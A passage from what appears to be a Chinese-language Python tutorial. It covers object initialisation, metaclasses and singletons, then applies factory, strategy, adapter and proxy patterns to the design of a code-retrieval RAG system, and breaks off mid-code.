function</span></span><br></pre></td></tr></table></figure><p><code>__del__</code> 方法：实例的销毁，用于<strong>对象销毁时</strong>执行清理工作。会在实例被垃圾回收时调用，通常用于关闭资源或执行清理操作。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__del__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Instance is being destroyed&quot;</span>)</span><br><span class="line"></span><br><span class="line">obj = MyClass()</span><br><span class="line"><span class="keyword">del</span> obj  <span class="comment"># 输出: Instance is being destroyed</span></span><br></pre></td></tr></table></figure><h2 id="对象的初始化">对象的初始化</h2><p>类的初始化过程包括<strong>类的创建</strong>和<strong>实例的初始化</strong>。当我们创建一个类的实例时，会依次调用 <code>__new__</code> 和 <code>__init__</code> 等方法来完成实例化流程。理解这个过程不仅有助于掌握 Python 的类机制，还可以通过自定义这些方法，控制类的创建和初始化行为，实现更多高级功能（如<strong>单例模式</strong>、<strong>池化对象</strong>等）。</p><p>当我们调用 <code>MyClass()</code> 创建类的实例时，Python 会经过以下几个主要步骤：</p><ol><li><p><code>__new__</code> 方法：创建实例。<code>__new__</code> 是一个<strong>静态方法</strong>，负责<strong>创建实例</strong>，并分配内存空间，通常返回一个新的实例对象。</p><ul><li><p><code>__new__</code> 的第一个参数是 <code>cls</code>，表示当前类，Python 会根据这个类来创建新实例。<code>__new__(cls, name, bases, dct)</code></p></li><li><p>如果 <code>__new__</code> 不返回实例（例如返回 <code>None</code> 或其他类型），则不会继续调用 <code>__init__</code>，实例化会中止。</p></li></ul><p>需要注意，object 对象是一个空的对象，是所有对象的父类。所以 super 返回了一个新的空白的对象。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__new__</span>(<span class="params">cls, *args, **kwargs</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Calling __new__&quot;</span>)</span><br><span class="line">        instance = <span class="built_in">super</span>().__new__(cls)</span><br><span class="line">        <span class="keyword">return</span> instance</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Calling __init__&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.value = value</span><br><span class="line"></span><br><span class="line">obj = MyClass(<span class="number">10</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p><code>__init__</code> 方法：初始化实例。<code>__init__</code> 的第一个参数是 <code>self</code>，表示新创建的实例对象。通常在 <code>__init__</code> 中设置对象的属性，并完成实例的初始配置。</p></li></ol><p>在类定义时，Python 实际上调用了**元类（MetaClass）**来创建类对象。默认情况下，Python 使用 <code>type</code> 作为元类，即 <code>type</code> 类是类的生成工厂。通过定义自定义的元类，可以在类创建时做更多的控制，例如在类生成前检查某些条件，或动态地添加方法和属性。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyMeta</span>(<span class="title class_ inherited__">type</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__new__</span>(<span class="params">cls, name, bases, dct</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Creating class <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>().__new__(cls, name, bases, dct)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>(metaclass=MyMeta):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 MyClass 类</span></span><br><span class="line"><span class="built_in">print</span>(MyClass)  <span class="comment"># 输出: Creating class MyClass</span></span><br></pre></td></tr></table></figure><h2 id="元类编程">元类编程</h2><p>通过重写 <code>__new__</code> 方法，可以确保类只有一个实例，实现<strong>单例模式</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton</span>:</span><br><span class="line">    _instance = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__new__</span>(<span class="params">cls</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> cls._instance:</span><br><span class="line">            cls._instance = <span class="built_in">super</span>().__new__(cls)</span><br><span class="line">        <span class="keyword">return</span> cls._instance</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意，<strong>元类的 <code>__call__</code></strong> 和 <strong>对象的 <code>__call__</code></strong> 是不一样的，它们的作用和用途是不同的。元类的 <code>__call__</code> 方法用于控制<strong>类的实例化过程</strong>，返回一个对象。当使用 <code>MyClass()</code> 来实例化一个类时，Python 会调用元类的 <code>__call__</code> 方法。在默认的实现中，元类的 <code>__call__</code> 负责调用类的 <code>__new__</code> 和 <code>__init__</code> 方法，以完成实例的创建和初始化。对象的 <code>__call__</code> 方法是定义在<strong>类实例</strong>上的，它让实例<strong>像函数一样可以被调用</strong>。</p><p>用元类来实现单例模式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SingletonMeta</span>(<span class="title class_ inherited__">type</span>):</span><br><span class="line">    _instances = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__call__</span>(<span class="params">cls, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">if</span> cls <span class="keyword">not</span> <span class="keyword">in</span> cls._instances:</span><br><span class="line">            cls._instances[cls] = <span class="built_in">super</span>().__call__(*args, **kwargs)</span><br><span class="line">        <span class="keyword">return</span> cls._instances[cls]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 SingletonMeta 作为元类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton</span>(metaclass=SingletonMeta):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value</span>):</span><br><span class="line">        <span class="variable language_">self</span>.value = value</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在多线程环境下，可能会出现多个线程同时创建实例的情况。通过在元类中加入线程锁，可以确保多线程下单例的唯一性。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadSafeSingletonMeta</span>(<span class="title class_ inherited__">type</span>):</span><br><span class="line">    _instances = &#123;&#125;</span><br><span class="line">    _lock = threading.Lock()  <span class="comment"># 线程锁，确保多线程安全</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__call__</span>(<span class="params">cls, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">with</span> cls._lock:</span><br><span class="line">            <span class="keyword">if</span> cls <span class="keyword">not</span> <span class="keyword">in</span> cls._instances:</span><br><span class="line">                cls._instances[cls] = <span class="built_in">super</span>().__call__(*args, **kwargs)</span><br><span class="line">        <span class="keyword">return</span> cls._instances[cls]</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadSafeSingleton</span>(metaclass=ThreadSafeSingletonMeta):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value</span>):</span><br><span class="line">        <span class="variable language_">self</span>.value = value</span><br></pre></td></tr></table></figure><p><strong>ORM 映射</strong>：在 ORM 框架中，将数据库表结构映射为类结构，简化数据库操作。这个真的非常常见，而且 dct 字段还包括了传进来的参数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TableMeta</span>(<span class="title class_ inherited__">type</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__new__</span>(<span class="params">cls, name, bases, dct</span>):</span><br><span class="line">        columns = &#123;key: value <span class="keyword">for</span> key, value <span class="keyword">in</span> dct.items() <span class="keyword">if</span> <span class="built_in">isinstance</span>(value, <span class="built_in">str</span>)&#125;</span><br><span class="line">        dct[<span class="string">&#x27;columns&#x27;</span>] = columns  <span class="comment"># 自动将字符串字段识别为表的字段</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>().__new__(cls, name, bases, dct)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>(metaclass=TableMeta):</span><br><span class="line">    <span class="built_in">id</span> = <span class="string">&#x27;INTEGER PRIMARY KEY&#x27;</span></span><br><span class="line">    name = <span class="string">&#x27;TEXT&#x27;</span></span><br><span class="line">    email = <span class="string">&#x27;TEXT&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(User.columns)  <span class="comment"># 输出: &#123;&#x27;id&#x27;: &#x27;INTEGER PRIMARY KEY&#x27;, &#x27;name&#x27;: &#x27;TEXT&#x27;, &#x27;email&#x27;: &#x27;TEXT&#x27;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="为什么-Python-是动态语言">为什么 Python 是动态语言</h2><p>Python 是一门典型的<strong>动态语言</strong>，这意味着它能够在运行时对对象的结构和行为进行修改，甚至可以动态地生成、修改和删除对象的属性和方法。这种动态性在开发业务逻辑密集型的应用时尤为高效，能够帮助程序员以更简洁、灵活的方式快速实现功能。</p><p>Python 对象通过 <code>__dict__</code> 属性（属性字典）管理自身的所有可动态改变的属性，这让 Python 对象能够随时添加、修改或删除属性和方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 为类添加新方法</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new_class_method</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;New method for MyClass!&quot;</span>)</span><br><span class="line"></span><br><span class="line">MyClass.new_method = new_class_method</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用新方法</span></span><br><span class="line">obj = MyClass()</span><br><span class="line">obj.new_method()  <span class="comment"># 输出: New method for MyClass!</span></span><br></pre></td></tr></table></figure><p>动态语言因其灵活性和开发效率而备受欢迎，尤其在业务逻辑密集的应用场景中，动态语言能够帮助程序员快速写出产品。比如说 Web 开发，数据科学和机器学习，自动化和脚本，核心在于业务逻辑。</p><p>动态语言的灵活性也带来了一个明显的缺点，即<strong>缺少静态类型</strong>。由于类型的缺失，动态语言的代码在复杂项目中可能变得难以理解和维护，尤其对于不熟悉项目或代码的新手来说。：许多 IDE 会依赖静态类型信息来提供智能提示、自动补全和类型检查。动态语言由于没有类型信息，IDE 很难准确地推断变量的类型，导致开发者得不到准确的智能提示。</p><p>所以建议多使用类型提示（Type Hints）。</p><h1>面向对象</h1><h2 id="需求分析">需求分析</h2><p>我们的目标是构建一个基于代码的 RAG（Retrieval-Augmented Generation）系统，专注于代码辅助工作。这个系统的核心流程包括将项目源代码转化为可检索的知识库（codebase），利用检索器进行相关性查询，并基于对话系统与用户交互，利用 LLM（大型语言模型）提供回答。</p><p>根据需求，我们可以提取以下<strong>名词</strong>，每个名词可能对应一个类或对象：</p><ul><li><strong>项目</strong>（Project）：表示用户输入的项目源代码集合。</li><li><strong>Codebase</strong>：代码知识库，用于存储和管理项目的源代码，使得其内容可被检索。</li><li><strong>检索器</strong>（Retriever）：一个工具类，用于在 <code>Codebase</code> 中执行搜索和相关性检索。</li><li><strong>对话</strong>（Conversation）：支持用户与 LLM 间的交互，对话会调用检索器在 <code>Codebase</code> 中查询答案。</li><li><strong>LLM</strong>（大型语言模型）：处理用户的自然语言问题并生成响应。与检索器结合以形成 RAG 系统。</li></ul><p>核心需求：</p><ol><li><p><strong>输入项目的源代码并构建 Codebase</strong></p><ul><li><p><strong>Project</strong>：作为源代码集合的抽象，负责加载、存储和管理项目文件。</p></li><li><p><strong>Codebase</strong>：负责接收 <code>Project</code> 的源代码数据，并通过适当的解析和处理，将源代码构建成可查询的知识库。</p></li></ul></li><li><p><strong>基于问题检索相关的源代码</strong></p><ul><li><p><strong>Retriever</strong>：通过索引和匹配算法在 <code>Codebase</code> 中查询并返回相关的代码片段。</p></li><li><p><strong>Query</strong>（可选）：用于封装用户的查询，允许对查询内容进行预处理或过滤（如提取代码相关的关键词）。</p></li></ul></li><li><p><strong>实现基于对话的交互，使用 Codebase 作为知识库</strong></p><ul><li><strong>Conversation</strong>：表示与用户的交互，管理对话流程，并与 LLM 进行通信。负责在需要时调用 <code>Retriever</code> 从 <code>Codebase</code> 中获取信息，以增强 LLM 的回答。</li></ul></li></ol><h2 id="类的设计">类的设计</h2><p>根据以上分析，可以划分出以下主要类及其职责：</p><table><thead><tr><th>类名</th><th>职责描述</th></tr></thead><tbody><tr><td><code>Project</code></td><td>表示用户输入的源代码项目，负责加载和管理项目文件。</td></tr><tr><td><code>Codebase</code></td><td>作为知识库，负责存储和管理项目源代码，并提供索引、解析等操作，使之可被 <code>Retriever</code> 查询。</td></tr><tr><td><code>Retriever</code></td><td>提供在 <code>Codebase</code> 中执行检索的功能，通过索引和关键词匹配找到相关代码片段。</td></tr><tr><td><code>Query</code>（可选）</td><td>封装用户的查询请求，提供查询预处理功能，如关键词提取。</td></tr><tr><td><code>Conversation</code></td><td>支持用户与 LLM 的交互，管理对话流并在需要时调用 <code>Retriever</code> 从 <code>Codebase</code> 中查询信息。</td></tr><tr><td><code>LLM</code></td><td>代表大型语言模型，负责接收用户的自然语言问题，结合 <code>Retriever</code> 的结果生成增强回答。</td></tr></tbody></table><h2 id="类间关系和交互">类间关系和交互</h2><p>根据类的职责和需求，我们可以进一步细化类之间的关系：</p><ul><li><strong>Project -&gt; Codebase</strong>：<code>Project</code> 提供源代码内容，<code>Codebase</code> 接收并存储这些内容。<code>Codebase</code> 需要从 <code>Project</code> 获取代码文件内容，解析后生成索引。</li><li><strong>Codebase &lt;-&gt; Retriever</strong>：<code>Retriever</code> 需要访问 <code>Codebase</code> 中的内容，执行搜索操作以找到与查询相关的代码片段。<code>Codebase</code> 提供检索接口以支持 <code>Retriever</code> 进行查询。</li><li><strong>Conversation -&gt; Retriever</strong>：<code>Conversation</code> 接收用户的自然语言问题，如果涉及代码查询，会将问题转化为 <code>Query</code>，并调用 <code>Retriever</code> 从 <code>Codebase</code> 检索答案。<code>Retriever</code> 的返回内容将传递给 <code>LLM</code> 以生成回答。</li><li><strong>Conversation -&gt; LLM</strong>：<code>Conversation</code> 与 <code>LLM</code> 交互，将用户的问题及 <code>Retriever</code> 返回的代码上下文传递给 <code>LLM</code>，由 <code>LLM</code> 生成回答并回复给用户。</li></ul><h1>设计模式</h1><h2 id="工厂模式"><strong>工厂模式</strong></h2><p>用于创建 <code>Project</code> 实例，封装实例化细节。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Project</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name: <span class="built_in">str</span>, source_files: <span class="type">List</span>[<span class="built_in">str</span>]</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = name</span><br><span class="line">        <span class="variable language_">self</span>.source_files = source_files</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">load_files</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 加载项目源代码文件的逻辑</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Loading files for project: <span class="subst">&#123;self.name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ProjectFactory</span>:</span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_project</span>(<span class="params">name: <span class="built_in">str</span>, source_files: <span class="type">List</span>[<span class="built_in">str</span>]</span>) -&gt; Project:</span><br><span class="line">        <span class="comment"># 根据需求，项目的创建逻辑可以在这里扩展</span></span><br><span class="line">        project = Project(name, source_files)</span><br><span class="line">        project.load_files()</span><br><span class="line">        <span class="keyword">return</span> project</span><br></pre></td></tr></table></figure><h2 id="策略模式">策略模式</h2><p><code>Codebase</code> 支持不同的存储方式（如内存或数据库），可使用策略模式动态选择存储方案。下面还可以看到我们抽象出了存储层当作接口，设计了两种存储方式，接着作为参数传入 codebase，实现不同策略的使用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Codebase类，支持不同存储策略（策略模式）</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">StorageStrategy</span>(<span class="title class_ inherited__">ABC</span>):</span><br><span class="line"><span class="meta">    @abstractmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">save_codebase</span>(<span class="params">self, code_data: <span class="type">Dict</span></span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @abstractmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">load_codebase</span>(<span class="params">self</span>) -&gt; <span class="type">Dict</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">InMemoryStorage</span>(<span class="title class_ inherited__">StorageStrategy</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>._data = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">save_codebase</span>(<span class="params">self, code_data: <span class="type">Dict</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>._data = code_data</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Codebase stored in memory.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">load_codebase</span>(<span class="params">self</span>) -&gt; <span class="type">Dict</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Loading codebase from memory.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._data</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DatabaseStorage</span>(<span class="title class_ inherited__">StorageStrategy</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>._data = &#123;&#125;  <span class="comment"># 实际实现中可以是数据库连接等</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">save_codebase</span>(<span class="params">self, code_data: <span class="type">Dict</span></span>):</span><br><span class="line">        <span class="comment"># 实际数据库存储逻辑</span></span><br><span class="line">        <span class="variable language_">self</span>._data = code_data  <span class="comment"># 这里模拟数据库存储</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Codebase stored in database.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">load_codebase</span>(<span class="params">self</span>) -&gt; <span class="type">Dict</span>:</span><br><span class="line">        <span class="comment"># 从数据库加载代码库</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Loading codebase from database.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._data</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Codebase</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, storage_strategy: StorageStrategy</span>):</span><br><span class="line">        <span class="variable language_">self</span>.storage_strategy = storage_strategy</span><br><span class="line">        <span class="variable language_">self</span>.index = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">build_codebase</span>(<span class="params">self, project: Project</span>):</span><br><span class="line">        <span class="comment"># 构建 codebase 逻辑，例如解析代码并构建索引</span></span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> project.source_files:</span><br><span class="line">            <span class="comment"># 假设这里生成了文件的索引信息</span></span><br><span class="line">            <span class="variable language_">self</span>.index[file] = <span class="string">f&quot;Indexed content of <span class="subst">&#123;file&#125;</span>&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.storage_strategy.save_codebase(<span class="variable language_">self</span>.index)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">search</span>(<span class="params">self, query: <span class="built_in">str</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">str</span>]:</span><br><span class="line">        <span class="comment"># 实现基本的检索功能，可以根据需要扩展或调用 Retriever 代理</span></span><br><span class="line">        results = [content <span class="keyword">for</span> file, content <span class="keyword">in</span> <span class="variable language_">self</span>.index.items() <span class="keyword">if</span> query <span class="keyword">in</span> content]</span><br><span class="line">        <span class="keyword">return</span> results</span><br></pre></td></tr></table></figure><h2 id="适配器模式"><strong>适配器模式</strong></h2><p>适合不更改老系统，和新的设计保持一致性。假设我们的系统中引入了一个新组件 <code>LegacyRetriever</code>，这是一个旧的检索系统，用于检索代码片段，但它的接口设计不同，只有 <code>search_code(query)</code> 方法，而我们当前的系统需要通过 <code>Retriever</code> 的 <code>retrieve(query)</code> 方法来调用它。</p><p>那么设置一个适配器，包裹一层，那么 <code>LegacyRetrieverAdapter</code> 就满足了 <code>Retriever</code> 的接口要求了。甚至我们还能使用 <code>self.__dict__.update(dict(execute=music_player.play))</code> 的方式动态地给类增加函数，那么更加灵活了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># LegacyRetriever 只提供了不兼容的 `search_code` 方法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LegacyRetriever</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, codebase</span>):</span><br><span class="line">        <span class="variable language_">self</span>.codebase = codebase</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">search_code</span>(<span class="params">self, query</span>):</span><br><span class="line">        <span class="comment"># 使用不同的查询方法</span></span><br><span class="line">        <span class="keyword">return</span> [content <span class="keyword">for</span> file, content <span class="keyword">in</span> <span class="variable language_">self</span>.codebase.index.items() <span class="keyword">if</span> query.lower() <span class="keyword">in</span> content.lower()]</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LegacyRetrieverAdapter</span>(<span class="title class_ inherited__">Retriever</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, legacy_retriever</span>):</span><br><span class="line">        <span class="variable language_">self</span>.legacy_retriever = legacy_retriever</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">retrieve</span>(<span class="params">self, query</span>):</span><br><span class="line">        <span class="comment"># 适配 `search_code` 为 `retrieve`</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.legacy_retriever.search_code(query)</span><br></pre></td></tr></table></figure><h2 id="代理模式">代理模式</h2><p>在代理模式（Proxy Pattern）中，代理对象作为访问其他对象的接口，通常用于在不改变目标对象的前提下，为其提供<strong>控制访问</strong>、<strong>懒加载</strong>、<strong>缓存</strong>或<strong>日志记录</strong>等附加功能。</p><p>假设我们希望增强 <code>Retriever</code> 的功能，可以使用代理模式来实现如下扩展：</p><ol><li><strong>访问控制</strong>：限制非授权用户的查询访问。</li><li><strong>缓存</strong>：缓存上次查询的结果，避免重复计算或检索。</li><li><strong>日志记录</strong>：记录每次查询的日志，便于后续查看或调试。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 访问控制的代理</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AccessControlProxyRetriever</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, retriever, authorized_users</span>):</span><br><span class="line">        <span class="variable language_">self</span>.retriever = retriever</span><br><span class="line">        <span class="variable language_">self</span>.authorized_users = authorized_users</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">retrieve</span>(<span class="params">self, query, user</span>):</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">not</span> <span class="keyword">in</span> <span class="variable language_">self</span>.authorized_users:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Access denied for user: <span class="subst">&#123;user&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Access granted for user: <span class="subst">&#123;user&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span 